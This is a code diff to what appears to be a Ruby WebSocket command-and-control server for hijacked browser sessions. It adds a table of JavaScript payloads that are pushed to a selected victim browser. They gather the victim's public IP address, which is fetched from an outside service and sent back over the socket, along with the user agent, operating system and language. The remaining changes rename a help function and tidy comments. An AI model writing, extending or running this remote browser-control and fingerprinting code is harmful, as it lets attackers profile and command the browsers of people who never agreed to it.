@@ -43,6 +43,14 @@ COMMANDS = {
     "get_cert" => "Get a free TLS certificate from LetsEncrypt",
     "load" => "Load a module (not implemented yet)"
 }
+INFO_COMMANDS = {
+    "IP" => "var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() 
+    { if (xhttp.readyState == 4 && xhttp.status == 200) { ws.send(\"IP Address: \" + xhttp.responseText); }};
+    xhttp.open(\"GET\", \"https://ipv4.icanhazip.com/\", true);xhttp.send();",
+    "USER_AGENT" => "\"User agent: \" + navigator.appVersion;",
+    "OPERATING_SYSTEM" => "\"OS: \" + navigator.platform;", 
+    "LANGUAGE" => "\"Language: \" + navigator.language;"
+}
 WELCOME_MESSAGE = ""\
 " ____                                  ____             _       _                  \n"\
 "|  _ \                                |  _ \           | |     | |                 \n"\
@@ -74,9 +82,7 @@ def print_notice(message)
 end
 
 def infoCommand()
-    # TODO: Improve method of getting IP address
-    infoCommands = ["var xhttp = new XMLHttpRequest();xhttp.open(\"GET\", \"https://ipv4.icanhazip.com/\", false);xhttp.send();xhttp.responseText","navigator.appVersion;", "navigator.platform;", "navigator.language;"]
-    infoCommands.each {|cmd|
+    INFO_COMMANDS.each {|key, cmd|
         begin
             sendCommand(cmd, $wsList[$selected])
         rescue
@@ -144,7 +150,7 @@ def useCommand(cmdIn)
     print_notice("Selected session is now " + $selected.to_s + ".")
 end
 
-def printHelp()
+def helpCommand()
     COMMANDS.each do |key, array|
         print key
         print " --> "
@@ -162,7 +168,7 @@ def cmdLine(host, port, secure)
         cmdIn = gets.chomp.split()
         case cmdIn[0]
         when "help"
-            printHelp()
+            helpCommand()
         when "exit"
             break
         when "sessions"
@@ -228,7 +234,8 @@ def startEM(host, port, secure, priv_key, cert_chain)
             ws.onclose {
                 print_error("Connection closed")
                 $wsList.delete(ws)
-                # TODO: Change this. Reset selected error so the wrong session is not used.
+                # TODO: Change this.
+                # Reset selected error so the wrong session is not used.
                 $selected = -1
             }
             ws.onmessage { |msg|
@@ -237,7 +244,7 @@ def startEM(host, port, secure, priv_key, cert_chain)
             ws.onerror { |e|
                 print_error(e.message)
                 $wsList.delete(ws)
-                # Reset selected variable after error
+                # Reset selected variable after error.
                 $selected = -1
             }
         end
